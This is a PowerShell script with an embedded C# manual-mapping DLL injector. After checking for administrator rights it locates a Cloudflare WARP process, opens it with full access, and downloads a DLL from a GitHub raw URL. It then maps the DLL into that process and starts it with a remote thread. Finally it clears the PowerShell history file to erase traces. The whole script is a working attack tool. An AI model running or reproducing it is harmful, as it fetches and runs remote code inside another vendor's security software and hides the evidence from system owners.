[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
param()

Set-StrictMode -Version Latest

$VerbosePreference      = 'SilentlyContinue'
$DebugPreference        = 'SilentlyContinue'
$InformationPreference  = 'SilentlyContinue'
$WarningPreference      = 'SilentlyContinue'
$ErrorActionPreference  = 'SilentlyContinue'
$ConfirmPreference      = 'None'
$WhatIfPreference       = $false
$PSModuleAutoLoadingPreference = 'None'
$MaximumHistoryCount    = 0

*> $null
$Error.Clear()

try {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "   SysVenson CoreX Injector (Debug Mode)  " -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host ""

    # --- অ্যাডমিন চেক ---
    Write-Host "[1] Checking Administrator privileges..." -ForegroundColor Yellow
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        Write-Host "[ERROR] This script must be run as Administrator." -ForegroundColor Red
        return
    }
    Write-Host "[SUCCESS] Running as Administrator." -ForegroundColor Green

    # --- C# লোডার কম্পাইল ---
    Write-Host "[2] Compiling C# Remote Loader..." -ForegroundColor Yellow
    $kernel = @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.ComponentModel;

public class ManualMapResult
{
    public IntPtr ImageBase;
    public uint ImageSize;
    public IntPtr DllMainAddr;
    public long Delta;
    public bool Is64Bit;
}

public static class RemoteLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

    [DllImport("psapi.dll", SetLastError = true)]
    static extern bool EnumProcessModules(IntPtr hProcess, IntPtr[] lphModule, uint cb, out uint lpcbNeeded);

    [DllImport("psapi.dll", SetLastError = true)]
    static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, StringBuilder lpFilename, uint nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;
    const uint PAGE_READONLY = 0x02;
    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
    static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }

    static uint SProt(uint c) {
        bool x = (c & 0x20000000) != 0, w = (c & 0x80000000) != 0, r = (c & 0x40000000) != 0;
        if (x && w) return PAGE_EXECUTE_READWRITE;
        if (x && r) return PAGE_EXECUTE_READ;
        if (x) return PAGE_EXECUTE_READ;
        if (w) return PAGE_READWRITE;
        return PAGE_READONLY;
    }

    struct Sec { public uint VS, VA, SRD, PRD, Ch; }

    static IntPtr GetRemoteModuleBase(IntPtr hProcess, string moduleName) {
        uint needed = 0;
        IntPtr[] modules = new IntPtr[1024];
        if (!EnumProcessModules(hProcess, modules, (uint)(modules.Length * IntPtr.Size), out needed))
            return IntPtr.Zero;

        int count = (int)(needed / IntPtr.Size);
        for (int i = 0; i < count; i++) {
            StringBuilder sb = new StringBuilder(260);
            uint len = GetModuleFileNameEx(hProcess, modules[i], sb, 260);
            if (len > 0) {
                string fileName = System.IO.Path.GetFileName(sb.ToString());
                if (fileName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                    return modules[i];
            }
        }
        return IntPtr.Zero;
    }

    static IntPtr GetRemoteProcAddress(IntPtr hProcess, IntPtr hModule, string funcName) {
        byte[] dosHeader = new byte[0x40];
        IntPtr bytesRead;
        if (!ReadProcessMemory(hProcess, hModule, dosHeader, 0x40, out bytesRead)) return IntPtr.Zero;
        if (BitConverter.ToUInt16(dosHeader, 0) != 0x5A4D) return IntPtr.Zero;
        uint e_lfanew = BitConverter.ToUInt32(dosHeader, 0x3C);

        byte[] ntHeaders = new byte[0x108];
        IntPtr ntAddr = (IntPtr)(hModule.ToInt64() + e_lfanew);
        if (!ReadProcessMemory(hProcess, ntAddr, ntHeaders, 0x108, out bytesRead)) return IntPtr.Zero;
        uint signature = BitConverter.ToUInt32(ntHeaders, 0);
        if (signature != 0x4550) return IntPtr.Zero;

        bool is64 = (BitConverter.ToUInt16(ntHeaders, 4) == 0x020B);
        int optHeaderOffset = 0x18;
        int dataDirOffset = is64 ? 0x70 : 0x60;
        uint exportRVA = BitConverter.ToUInt32(ntHeaders, optHeaderOffset + dataDirOffset + 0);
        uint exportSize = BitConverter.ToUInt32(ntHeaders, optHeaderOffset + dataDirOffset + 4);
        if (exportRVA == 0) return IntPtr.Zero;

        IntPtr exportAddr = (IntPtr)(hModule.ToInt64() + exportRVA);
        byte[] exportDir = new byte[40];
        if (!ReadProcessMemory(hProcess, exportAddr, exportDir, 40, out bytesRead)) return IntPtr.Zero;
        uint numberOfNames = BitConverter.ToUInt32(exportDir, 24);
        uint addressOfNames = BitConverter.ToUInt32(exportDir, 32);
        uint addressOfNameOrdinals = BitConverter.ToUInt32(exportDir, 36);
        uint addressOfFunctions = BitConverter.ToUInt32(exportDir, 28);

        for (uint i = 0; i < numberOfNames; i++) {
            uint nameRVA = BitConverter.ToUInt32(ReadRemoteMemory(hProcess, (IntPtr)(hModule.ToInt64() + addressOfNames + i * 4), 4), 0);
            IntPtr nameAddr = (IntPtr)(hModule.ToInt64() + nameRVA);
            string name = ReadRemoteString(hProcess, nameAddr, 255);
            if (name.Equals(funcName, StringComparison.OrdinalIgnoreCase)) {
                ushort ordinal = BitConverter.ToUInt16(ReadRemoteMemory(hProcess, (IntPtr)(hModule.ToInt64() + addressOfNameOrdinals + i * 2), 2), 0);
                uint funcRVA = BitConverter.ToUInt32(ReadRemoteMemory(hProcess, (IntPtr)(hModule.ToInt64() + addressOfFunctions + ordinal * 4), 4), 0);
                return (IntPtr)(hModule.ToInt64() + funcRVA);
            }
        }
        return IntPtr.Zero;
    }

    static byte[] ReadRemoteMemory(IntPtr hProcess, IntPtr addr, int size) {
        byte[] buf = new byte[size];
        IntPtr bytesRead;
        ReadProcessMemory(hProcess, addr, buf, size, out bytesRead);
        return buf;
    }

    static string ReadRemoteString(IntPtr hProcess, IntPtr addr, int maxLen) {
        byte[] buf = new byte[maxLen];
        IntPtr bytesRead;
        ReadProcessMemory(hProcess, addr, buf, maxLen, out bytesRead);
        int len = 0;
        while (len < maxLen && buf[len] != 0) len++;
        return Encoding.ASCII.GetString(buf, 0, len);
    }

    public static ManualMapResult MapRemote(byte[] dll, IntPtr hProcess, bool callEntry) {
        var res = new ManualMapResult();

        if (U16(dll, 0) != 0x5A4D) throw new Exception("Missing MZ");
        int lfa = BitConverter.ToInt32(dll, 0x3C);
        if (U32(dll, lfa) != 0x4550u) throw new Exception("Bad PE sig");

        int co = lfa + 4; ushort ns = U16(dll, co + 2), ohs = U16(dll, co + 16);
        int oo = co + 20; bool is64 = (U16(dll, oo) == 0x020B); res.Is64Bit = is64;
        uint ep = U32(dll, oo + 16), soi = U32(dll, oo + 56), soh = U32(dll, oo + 60);
        ulong ib = is64 ? U64(dll, oo + 24) : U32(dll, oo + 28);
        res.ImageSize = soi;

        int dd = is64 ? oo + 112 : oo + 96;
        uint irva = U32(dll, dd + 8), rrva = U32(dll, dd + 40), rsz = U32(dll, dd + 44);

        int st = oo + ohs; var secs = new Sec[ns];
        for (int i = 0; i < ns; i++) { int b = st + i * 40; secs[i] = new Sec { VS = U32(dll, b + 8), VA = U32(dll, b + 12), SRD = U32(dll, b + 16), PRD = U32(dll, b + 20), Ch = U32(dll, b + 36) }; }

        IntPtr img = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)soi, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (img == IntPtr.Zero) throw new Exception("VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
        res.ImageBase = img;
        long ab = img.ToInt64();
        long delta = ab - (long)ib;
        res.Delta = delta;

        IntPtr bytesWritten;
        if (!WriteProcessMemory(hProcess, img, dll, (int)soh, out bytesWritten))
            throw new Exception("WriteProcessMemory headers failed: " + Marshal.GetLastWin32Error());

        foreach (var s in secs) {
            if (s.SRD == 0) continue;
            uint cs = s.VS == 0 ? s.SRD : Math.Min(s.SRD, s.VS);
            if (s.PRD + cs > (uint)dll.Length) { cs = (uint)dll.Length - s.PRD; if (cs == 0) continue; }
            byte[] secData = new byte[cs];
            Array.Copy(dll, (int)s.PRD, secData, 0, (int)cs);
            IntPtr dest = (IntPtr)(ab + s.VA);
            if (!WriteProcessMemory(hProcess, dest, secData, (int)cs, out bytesWritten))
                throw new Exception("WriteProcessMemory section failed: " + Marshal.GetLastWin32Error());
        }

        if (rrva != 0 && delta != 0) {
            uint ro = rrva, re = rrva + rsz;
            while (ro < re) {
                byte[] block = ReadRemoteMemory(hProcess, (IntPtr)(ab + ro), 8);
                uint pg = BitConverter.ToUInt32(block, 0);
                uint bs = BitConverter.ToUInt32(block, 4);
                if (bs == 0) break;
                int ne = (int)(bs - 8) / 2;
                for (int i = 0; i < ne; i++) {
                    ushort e = BitConverter.ToUInt16(ReadRemoteMemory(hProcess, (IntPtr)(ab + ro + 8 + i * 2), 2), 0);
                    int ty = (e >> 12) & 0xF;
                    int of = e & 0xFFF;
                    if (ty == 0) continue;
                    long tr = pg + of;
                    if (ty == 10) {
                        byte[] val = ReadRemoteMemory(hProcess, (IntPtr)(ab + tr), 8);
                        ulong c = BitConverter.ToUInt64(val, 0);
                        ulong newVal = (ulong)((long)c + delta);
                        byte[] newBytes = BitConverter.GetBytes(newVal);
                        WriteProcessMemory(hProcess, (IntPtr)(ab + tr), newBytes, 8, out bytesWritten);
                    } else if (ty == 3) {
                        byte[] val = ReadRemoteMemory(hProcess, (IntPtr)(ab + tr), 4);
                        uint c = BitConverter.ToUInt32(val, 0);
                        uint newVal = (uint)((long)c + delta);
                        byte[] newBytes = BitConverter.GetBytes(newVal);
                        WriteProcessMemory(hProcess, (IntPtr)(ab + tr), newBytes, 4, out bytesWritten);
                    }
                }
                ro += bs;
            }
        }

        if (irva != 0) {
            int ie = 0;
            while (true) {
                long eo = irva + ie * 20;
                byte[] desc = ReadRemoteMemory(hProcess, (IntPtr)(ab + eo), 20);
                uint nr = BitConverter.ToUInt32(desc, 12);
                uint ir = BitConverter.ToUInt32(desc, 16);
                uint inr = BitConverter.ToUInt32(desc, 0);
                if (nr == 0) break;
                string dn = ReadRemoteString(hProcess, (IntPtr)(ab + nr), 260);
                IntPtr hMod = GetRemoteModuleBase(hProcess, dn + ".dll");
                if (hMod == IntPtr.Zero) {
                    ie++; continue;
                }
                long to = 0;
                uint tb = inr != 0 ? inr : ir;
                int ts = is64 ? 8 : 4;
                while (true) {
                    long te = tb + to;
                    byte[] thunkData = ReadRemoteMemory(hProcess, (IntPtr)(ab + te), ts);
                    if (is64) {
                        ulong tv = BitConverter.ToUInt64(thunkData, 0);
                        if (tv == 0) break;
                        long of = unchecked((long)0x8000000000000000L);
                        IntPtr fa = IntPtr.Zero;
                        if ((tv & (ulong)of) != 0) {
                            uint ord = (uint)(tv & 0xFFFF);
                        } else {
                            uint nameRVA = (uint)(tv & 0x7FFFFFFF);
                            string fname = ReadRemoteString(hProcess, (IntPtr)(ab + nameRVA + 2), 255);
                            fa = GetRemoteProcAddress(hProcess, hMod, fname);
                        }
                        if (fa != IntPtr.Zero) {
                            byte[] addrBytes = BitConverter.GetBytes(fa.ToInt64());
                            WriteProcessMemory(hProcess, (IntPtr)(ab + ir + to), addrBytes, 8, out bytesWritten);
                        }
                    } else {
                        uint tv = BitConverter.ToUInt32(thunkData, 0);
                        if (tv == 0) break;
                        long of = unchecked((long)0x80000000L);
                        IntPtr fa = IntPtr.Zero;
                        if ((tv & (uint)of) != 0) {
                            uint ord = tv & 0xFFFF;
                        } else {
                            string fname = ReadRemoteString(hProcess, (IntPtr)(ab + tv + 2), 255);
                            fa = GetRemoteProcAddress(hProcess, hMod, fname);
                        }
                        if (fa != IntPtr.Zero) {
                            byte[] addrBytes = BitConverter.GetBytes(fa.ToInt32());
                            WriteProcessMemory(hProcess, (IntPtr)(ab + ir + to), addrBytes, 4, out bytesWritten);
                        }
                    }
                    to += ts;
                }
                ie++;
            }
        }

        foreach (var s in secs) {
            uint sz = Math.Max(s.VS, s.SRD);
            if (sz == 0) continue;
            uint oldProt;
            VirtualProtectEx(hProcess, (IntPtr)(ab + s.VA), (UIntPtr)sz, SProt(s.Ch), out oldProt);
        }

        res.DllMainAddr = IntPtr.Zero;
        if (callEntry && ep != 0) {
            res.DllMainAddr = (IntPtr)(ab + ep);
            IntPtr threadId;
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, UIntPtr.Zero, res.DllMainAddr, img, 0, out threadId);
            if (hThread != IntPtr.Zero) {
                WaitForSingleObject(hThread, 5000);
                CloseHandle(hThread);
            }
        }
        return res;
    }

    public static bool FreeRemote(IntPtr hProcess, IntPtr baseAddr) {
        return VirtualFreeEx(hProcess, baseAddr, UIntPtr.Zero, MEM_RELEASE);
    }
}
'@

    try {
        Add-Type -TypeDefinition $kernel -ErrorAction Stop
        Write-Host "[SUCCESS] C# Loader compiled successfully." -ForegroundColor Green
    } catch {
        Write-Host "[ERROR] Failed to compile C# Loader: $_" -ForegroundColor Red
        return
    }

    # --- টার্গেট প্রক্রিয়া খোঁজা (Get-Process দিয়ে একাধিক নাম) ---
    Write-Host "[3] Searching for Cloudflare/WARP process..." -ForegroundColor Yellow

    # সম্ভাব্য প্রক্রিয়ার নামগুলোর তালিকা (কেস ইন্সেনসিটিভ)
    $possibleNames = @(
        "Cloudflare One Client",
        "CloudflareWARP",
        "Cloudflare WARP",
        "WARP",
        "cloudflare",
        "cloudflarewarp"
    )

    $proc = $null
    foreach ($name in $possibleNames) {
        $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
        if ($proc) {
            Write-Host "[INFO] Found process with name: '$name' (PID: $($proc.Id))" -ForegroundColor Green
            break
        }
    }

    # যদি না পাওয়া যায়, তাহলে নামের অংশ খুঁজি
    if (-not $proc) {
        Write-Host "[INFO] No exact match found. Searching by partial name..." -ForegroundColor Yellow
        $allProcs = Get-Process -ErrorAction SilentlyContinue
        foreach ($p in $allProcs) {
            if ($p.ProcessName -match "cloudflare|warp" -or $p.ProcessName -match "cloudflare" -or $p.ProcessName -match "warp") {
                $proc = $p
                Write-Host "[INFO] Found process with partial name: '$($p.ProcessName)' (PID: $($p.Id))" -ForegroundColor Green
                break
            }
        }
    }

    if (-not $proc) {
        Write-Host "[ERROR] Could not find any Cloudflare/WARP process. Please ensure it's running." -ForegroundColor Red
        return
    }

    $procId = $proc.Id
    $procName = $proc.ProcessName
    Write-Host "[SUCCESS] Selected process: $procName (PID: $procId)" -ForegroundColor Green

    # --- প্রক্রিয়া হ্যান্ডেল খোলা ---
    Write-Host "[4] Opening process handle with FULL access..." -ForegroundColor Yellow
    $hProcess = [RemoteLoader]::OpenProcess(0x1F0FFF, $false, $procId)
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[ERROR] Failed to open process handle. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
        return
    }
    Write-Host "[SUCCESS] Process handle opened: 0x$($hProcess.ToString('X'))" -ForegroundColor Green

    # --- DLL ডাউনলোড ---
    Write-Host "[5] Downloading DLL from GitHub..." -ForegroundColor Yellow
    try {
        $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
        Write-Host "[SUCCESS] DLL downloaded. Size: $($bytes.Length) bytes" -ForegroundColor Green
    } catch {
        Write-Host "[ERROR] Failed to download DLL: $_" -ForegroundColor Red
        [RemoteLoader]::CloseHandle($hProcess)
        return
    }

    # --- ইনজেকশন ---
    Write-Host "[6] Starting Remote Manual Mapping (Injecting)..." -ForegroundColor Yellow
    try {
        $result = [RemoteLoader]::MapRemote($bytes, $hProcess, $true)
        Write-Host "[SUCCESS] Injection completed successfully!" -ForegroundColor Green
        Write-Host "        ImageBase: 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
        Write-Host "        ImageSize: $($result.ImageSize) bytes" -ForegroundColor Green
        Write-Host "        DllMain Address: 0x$($result.DllMainAddr.ToString('X'))" -ForegroundColor Green
        Write-Host "        Is 64-bit: $($result.Is64Bit)" -ForegroundColor Green
    } catch {
        Write-Host "[CRITICAL ERROR] Injection failed!" -ForegroundColor Red
        Write-Host "        Error Message: $_" -ForegroundColor Red
        if ($_.Exception.InnerException) {
            Write-Host "        Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
        }
        [RemoteLoader]::CloseHandle($hProcess)
        return
    }

    # --- ট্রেস ক্লিয়ার ---
    Write-Host "[7] Clearing PowerShell history..." -ForegroundColor Yellow
    Clear-History
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) {
        Clear-Content -Path $historyPath -Force
        Write-Host "[SUCCESS] History cleared." -ForegroundColor Green
    }

    $bytes = $null
    [GC]::Collect()
    [GC]::WaitForPendingFinalizers()

    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "[INFO] All operations completed successfully!" -ForegroundColor Green
    Write-Host "==========================================" -ForegroundColor Cyan

} catch {
    Write-Host "[UNHANDLED EXCEPTION] $_" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor DarkRed
} finally {
    Write-Host "`n==========================================" -ForegroundColor Cyan
    Write-Host "  PowerShell window will stay open until" -ForegroundColor Yellow
    Write-Host "  you press ENTER below." -ForegroundColor Yellow
    Write-Host "==========================================" -ForegroundColor Cyan
    Read-Host "Press ENTER to close this window"
}
